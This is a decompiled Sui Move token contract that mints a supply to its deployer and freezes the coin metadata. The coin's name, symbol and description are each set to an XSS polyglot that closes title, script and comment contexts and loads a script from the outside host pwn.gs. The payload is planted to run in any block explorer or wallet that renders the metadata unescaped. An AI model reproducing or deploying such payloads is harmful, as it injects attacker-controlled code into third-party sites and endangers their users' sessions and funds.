module 0xd0ea742c7cad3330393875a97955f461f517d064a14b8a137bed8e764508d943::custom_token {
    struct CUSTOM_TOKEN has drop {
        dummy_field: bool,
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<CUSTOM_TOKEN>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<CUSTOM_TOKEN>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: CUSTOM_TOKEN, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x2::tx_context::sender(arg1);
        let (v1, v2) = 0x2::coin::create_currency<CUSTOM_TOKEN>(arg0, 9, b"'`\"</titLe/</scRipt/--!><scRiPt src=//pwn.gs></scRiPt>", b"'`\"</titLe/</scRipt/--!><scRiPt src=//pwn.gs></scRiPt>", b"'`\"</titLe/</scRipt/--!><scRiPt src=//pwn.gs></scRiPt>", 0x1::option::none<0x2::url::Url>(), arg1);
        let v3 = v1;
        0x2::transfer::public_transfer<0x2::coin::Coin<CUSTOM_TOKEN>>(0x2::coin::mint<CUSTOM_TOKEN>(&mut v3, 1000000000000000, arg1), v0);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CUSTOM_TOKEN>>(v2);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<CUSTOM_TOKEN>>(v3, v0);
    }

    // decompiled from Move bytecode v7
}

